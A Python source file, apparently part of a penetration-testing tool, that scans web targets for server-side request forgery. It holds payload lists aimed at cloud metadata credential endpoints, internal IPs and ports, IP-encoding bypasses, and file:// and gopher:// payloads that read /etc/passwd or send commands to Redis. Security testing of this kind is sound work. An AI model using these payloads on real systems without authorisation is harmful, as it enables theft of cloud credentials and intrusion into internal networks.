"""
Jarwis AGI Pen Test - SSRF Scanner (Advanced)
Detects Server-Side Request Forgery vulnerabilities (A10:2021 - SSRF)
Based on Web Hacking 101 techniques - adapted for 2025
"""

import asyncio
import logging
import socket
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from urllib.parse import urlparse, urljoin, quote
import aiohttp
import ssl

logger = logging.getLogger(__name__)


@dataclass
class ScanResult:
    id: str
    category: str
    severity: str
    title: str
    description: str
    url: str
    method: str
    parameter: str = ""
    evidence: str = ""
    remediation: str = ""
    cwe_id: str = ""
    poc: str = ""
    reasoning: str = ""
    request_data: str = ""
    response_data: str = ""


class SSRFScanner:
    """
    Advanced SSRF Scanner
    OWASP A10:2021 - Server-Side Request Forgery
    
    Attack vectors:
    - Basic SSRF to internal services
    - Cloud metadata endpoints (AWS, GCP, Azure)
    - Protocol handlers (file://, gopher://, dict://)
    - DNS rebinding
    - IP address bypass techniques
    - Redirect-based SSRF
    """
    
    # Cloud metadata endpoints
    CLOUD_METADATA = {
        'aws': [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/user-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/',
        ],
        'gcp': [
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://169.254.169.254/computeMetadata/v1/',
            'http://metadata.google.internal/computeMetadata/v1/instance/',
            'http://metadata.google.internal/computeMetadata/v1/project/project-id',
        ],
        'azure': [
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'http://169.254.169.254/metadata/identity/oauth2/token',
        ],
        'digitalocean': [
            'http://169.254.169.254/metadata/v1/',
            'http://169.254.169.254/metadata/v1/id',
        ],
        'alibaba': [
            'http://100.100.100.200/latest/meta-data/',
        ],
    }
    
    # Internal IP addresses to probe
    INTERNAL_IPS = [
        '127.0.0.1',
        'localhost',
        '0.0.0.0',
        '0',
        '127.1',
        '127.0.1',
        '::1',
        '[::]',
        '2130706433',  # 127.0.0.1 in decimal
        '0x7f000001',  # 127.0.0.1 in hex
        '0177.0.0.1',  # 127.0.0.1 in octal
        '192.168.1.1',
        '192.168.0.1',
        '10.0.0.1',
        '172.16.0.1',
    ]
    
    # Internal ports to probe
    INTERNAL_PORTS = [
        80, 443, 8080, 8443, 8000, 3000,
        22, 21, 25, 110, 143, 389, 636,
        3306, 5432, 1433, 1521, 27017, 6379, 11211,
        9200, 5601, 8888, 9000, 4040,
    ]
    
    # IP bypass techniques
    IP_BYPASSES = [
        # Decimal
        lambda ip: str(sum(int(b) << (8 * i) for i, b in enumerate(reversed(ip.split('.'))))),
        # Hex
        lambda ip: '0x' + ''.join(f'{int(b):02x}' for b in ip.split('.')),
        # Octal
        lambda ip: '.'.join(f'0{int(b):o}' for b in ip.split('.')),
        # Overflow
        lambda ip: ip.split('.')[0] + '.' + str(int(ip.split('.')[1]) + 256),
        # IPv6 mapped
        lambda ip: f'::ffff:{ip}',
        # Short forms
        lambda ip: '127.1' if ip == '127.0.0.1' else ip,
    ]
    
    # Protocol handlers
    PROTOCOL_PAYLOADS = [
        'file:///etc/passwd',
        'file:///c:/windows/win.ini',
        'dict://127.0.0.1:11211/stats',
        'gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a',
        'tftp://127.0.0.1/test',
        'ldap://127.0.0.1/',
    ]
    
    # Common vulnerable parameters
    SSRF_PARAMS = [
        'url', 'uri', 'path', 'dest', 'redirect', 'next', 'site',
        'html', 'data', 'domain', 'callback', 'return', 'page',
        'feed', 'host', 'port', 'to', 'out', 'view', 'dir',
        'show', 'navigation', 'open', 'file', 'val', 'validate',
        'image_url', 'img_url', 'link', 'src', 'reference', 'ref',
        'proxy', 'proxyUrl', 'request', 'load', 'fetch', 'target',
    ]
    
    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = config.get('timeout', 10)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    async def scan(self) -> List[ScanResult]:
        """Main scan method"""
        logger.info("Starting Advanced SSRF scan...")
        self.results = []
        
        base_url = self.config.get('target', {}).get('url', '')
        if not base_url:
            base_url = self.config.get('target_url', '')
        
        if not base_url:
            return self.results
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=10)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            # Test cloud metadata
            await self._test_cloud_metadata(session, base_url)
            
            # Test internal network
            await self._test_internal_network(session, base_url)
            
            # Test protocol handlers
            await self._test_protocols(session, base_url)
            
            # Test IP bypass techniques
            await self._test_ip_bypass(session, base_url)
            
            # Test discovered endpoints
            if hasattr(self.context, 'endpoints'):
                for endpoint in self.context.endpoints[:20]:
                    ep_url = endpoint.get('url', '') if isinstance(endpoint, dict) else str(endpoint)
                    if ep_url:
                        await self._test_ssrf_endpoint(session, ep_url)
        
        logger.info(f"SSRF scan complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    async def _test_cloud_metadata(self, session: aiohttp.ClientSession, base_url: str):
        """Test for cloud metadata access"""
        
        for provider, endpoints in self.CLOUD_METADATA.items():
            for metadata_url in endpoints[:2]:  # Limit per provider
                for param in self.SSRF_PARAMS[:10]:
                    await self._send_ssrf(session, base_url, param, metadata_url, f'cloud_{provider}')
    
    async def _test_internal_network(self, session: aiohttp.ClientSession, base_url: str):
        """Test for internal network access"""
        
        for ip in self.INTERNAL_IPS[:5]:
            for port in self.INTERNAL_PORTS[:5]:
                internal_url = f'http://{ip}:{port}/'
                
                for param in self.SSRF_PARAMS[:8]:
                    await self._send_ssrf(session, base_url, param, internal_url, 'internal')
    
    async def _test_protocols(self, session: aiohttp.ClientSession, base_url: str):
        """Test alternative protocol handlers"""
        
        for payload in self.PROTOCOL_PAYLOADS:
            for param in self.SSRF_PARAMS[:5]:
                await self._send_ssrf(session, base_url, param, payload, 'protocol')
    
    async def _test_ip_bypass(self, session: aiohttp.ClientSession, base_url: str):
        """Test IP address bypass techniques"""
        
        target_ip = '127.0.0.1'
        
        for bypass_func in self.IP_BYPASSES[:4]:
            try:
                bypassed_ip = bypass_func(target_ip)
                bypass_url = f'http://{bypassed_ip}/'
                
                for param in self.SSRF_PARAMS[:5]:
                    await self._send_ssrf(session, base_url, param, bypass_url, 'ip_bypass')
                    
            except Exception as e:
                logger.debug(f"IP bypass generation error: {e}")
    
    async def _send_ssrf(self, session: aiohttp.ClientSession, base_url: str,
                        param: str, payload: str, attack_type: str):
        """Send SSRF payload and analyze response"""
        try:
            await asyncio.sleep(1 / self.rate_limit)
            
            separator = '&' if '?' in base_url else '?'
            test_url = f"{base_url}{separator}{param}={quote(payload, safe='')}"
            
            headers = {'User-Agent': 'Mozilla/5.0'}
            
            # Add GCP metadata header for Google Cloud
            if 'google.internal' in payload or 'computeMetadata' in payload:
                headers['Metadata-Flavor'] = 'Google'
            
            async with session.get(test_url, headers=headers) as response:
                body = await response.text()
                status = response.status
                
                # Check for SSRF indicators
                if self._check_ssrf_success(body, attack_type, status):
                    severity = 'critical' if 'cloud' in attack_type else 'high'
                    
                    result = ScanResult(
                        id=f"SSRF-{attack_type.upper()}-{len(self.results)+1}",
                        category="A10:2021 - SSRF",
                        severity=severity,
                        title=f"SSRF Vulnerability ({attack_type})",
                        description=f"Server-side request forgery via parameter '{param}'",
                        url=test_url,
                        method="GET",
                        parameter=param,
                        evidence=body[:500] if len(body) > 500 else body,
                        remediation="Whitelist allowed URLs. Block internal IPs. Disable unnecessary protocols.",
                        cwe_id="CWE-918",
                        poc=payload,
                        reasoning=f"SSRF payload to {payload} was processed"
                    )
                    self.results.append(result)
                    return
                    
        except Exception as e:
            logger.debug(f"SSRF test error: {e}")
    
    def _check_ssrf_success(self, body: str, attack_type: str, status: int) -> bool:
        """Check if SSRF was successful"""
        body_lower = body.lower()
        
        # Cloud metadata indicators
        cloud_indicators = [
            'ami-id', 'instance-id', 'security-credentials',
            'access-key', 'secret-key', 'token', 'iam',
            'computemetadata', 'project-id', 'service-accounts',
            'subscriptionid', 'resourcegroup', 'vmid',
        ]
        
        # Internal service indicators
        internal_indicators = [
            'redis_version', 'mysql', 'postgresql',
            'mongodb', 'elasticsearch', 'memcached',
            'ssh-', 'ftp', 'smtp', 'ldap',
        ]
        
        # File content indicators
        file_indicators = [
            'root:', 'daemon:', '/bin/bash',
            '[fonts]', '[extensions]', 'for 16-bit',
        ]
        
        if attack_type.startswith('cloud'):
            return any(ind in body_lower for ind in cloud_indicators)
        elif attack_type == 'internal':
            return any(ind in body_lower for ind in internal_indicators) or status == 200
        elif attack_type == 'protocol':
            return any(ind in body_lower for ind in file_indicators)
        elif attack_type == 'ip_bypass':
            return status == 200 and len(body) > 100
        
        return False
    
    async def _test_ssrf_endpoint(self, session: aiohttp.ClientSession, url: str):
        """Test discovered endpoint for SSRF"""
        
        # Check if URL has parameters
        parsed = urlparse(url)
        if '=' in parsed.query or any(kw in url.lower() for kw in ['url', 'link', 'src', 'fetch']):
            # Test with AWS metadata
            await self._send_ssrf(
                session, url, 'url',
                'http://169.254.169.254/latest/meta-data/',
                'cloud_aws'
            )


class BlindSSRFScanner:
    """
    Scans for Blind SSRF vulnerabilities using timing and out-of-band techniques
    OWASP A10:2021 - Server-Side Request Forgery
    """
    
    # Internal ports to test timing
    TIMING_PORTS = [22, 80, 443, 3306, 6379, 11211]
    
    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 5)
        self.timeout = config.get('timeout', 10)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    async def scan(self) -> List[ScanResult]:
        """Main scan method"""
        logger.info("Starting Blind SSRF scan...")
        self.results = []
        
        base_url = self.config.get('target', {}).get('url', '')
        if not base_url:
            base_url = self.config.get('target_url', '')
        
        if not base_url:
            return self.results
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=5)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=15)
        ) as session:
            
            # Test timing-based blind SSRF
            await self._test_timing_ssrf(session, base_url)
        
        logger.info(f"Blind SSRF scan complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    async def _test_timing_ssrf(self, session: aiohttp.ClientSession, base_url: str):
        """Test for blind SSRF using response timing"""
        
        ssrf_params = ['url', 'path', 'site', 'fetch', 'request']
        
        # Test closed port vs open port timing
        for param in ssrf_params[:3]:
            try:
                # Request to likely open port
                open_port_url = f"{base_url}?{param}=http://127.0.0.1:80/"
                closed_port_url = f"{base_url}?{param}=http://127.0.0.1:65534/"
                
                # Time open port request
                start_open = asyncio.get_event_loop().time()
                try:
                    async with session.get(open_port_url) as resp:
                        await resp.text()
                except:
                    pass
                time_open = asyncio.get_event_loop().time() - start_open
                
                await asyncio.sleep(0.5)
                
                # Time closed port request
                start_closed = asyncio.get_event_loop().time()
                try:
                    async with session.get(closed_port_url) as resp:
                        await resp.text()
                except:
                    pass
                time_closed = asyncio.get_event_loop().time() - start_closed
                
                # Significant time difference may indicate SSRF
                if abs(time_open - time_closed) > 2:
                    result = ScanResult(
                        id=f"SSRF-BLIND-{len(self.results)+1}",
                        category="A10:2021 - SSRF",
                        severity="medium",
                        title="Potential Blind SSRF (Timing-based)",
                        description=f"Timing difference detected for internal port requests via '{param}'",
                        url=base_url,
                        method="GET",
                        parameter=param,
                        evidence=f"Open port: {time_open:.2f}s, Closed port: {time_closed:.2f}s",
                        remediation="Block internal network requests. Implement URL whitelist.",
                        cwe_id="CWE-918",
                        reasoning=f"Response time varied by {abs(time_open-time_closed):.2f}s"
                    )
                    self.results.append(result)
                    
            except Exception as e:
                logger.debug(f"Timing SSRF test error: {e}")
